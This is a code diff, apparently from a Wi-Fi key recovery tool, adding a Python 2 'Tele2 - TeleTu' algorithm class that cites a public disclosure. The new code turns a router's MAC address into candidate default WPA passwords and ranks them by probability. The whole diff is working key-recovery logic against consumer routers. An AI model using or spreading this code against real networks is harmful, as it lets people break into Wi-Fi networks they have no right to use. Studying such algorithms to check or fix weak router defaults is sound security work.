@@ -21,6 +21,9 @@ import os
 import re
 
 class Tele2(WpaAlgorithm):
+    """Tele2 - TeleTu algorithm
+    based on swsooue and Deinde disclosure
+    """
 
     alg_name = 'tele2'
 
@@ -42,14 +45,32 @@ class Tele2(WpaAlgorithm):
                     config_dict[match[0]]=[substruct, ]
         return config_dict
 
-    def find_mac_position(self, wmac):
-        struct = self.parsed_config.get(wmac[0:6])
+    def compute_probability(self, position, start, end):
+        if start <= position <= end:
+            return 1.0
+        delta = float(int(end, 16)-int(start, 16))
+        if start > position:
+            return delta/(int(end, 16)-int(position, 16))
+        return delta/(int(position, 16)-int(end, 16))
+
+    def find_wpas(self, wmac):
+        def build_wpa_string(sub):
+            return ''.join([sub['sn1'],'Y','%0*d'%(7, (int(wmac[6:],16)-int(sub['base'],16))/2)])
+        struct = self.parsed_config.get(wmac[:6])
         if struct is None:
             raise WpaNotFound('wmac not in range')
-        deltas = []
-
+        positions = []
+        for substruct in struct:
+            if wmac[6:] > substruct['base']:
+                positions.append(dict(
+                    wpa=build_wpa_string(substruct),
+                    probability=self.compute_probability(wmac[6:], substruct['start'], substruct['end'])))
+        return sorted(positions, key=lambda sub: sub['probability'], reverse=True)
 
     def run(self, network):
-        print self.parsed_config
-        return '2'
+        try:
+            strings = ["wpa: %s probability:%f" % (w['wpa'], w['probability']) for w in self.find_wpas(network.wmac.replace(':', ''))]
+            return '\n'.join(strings)
+        except WpaNotFound, err:
+            return err.msg
 
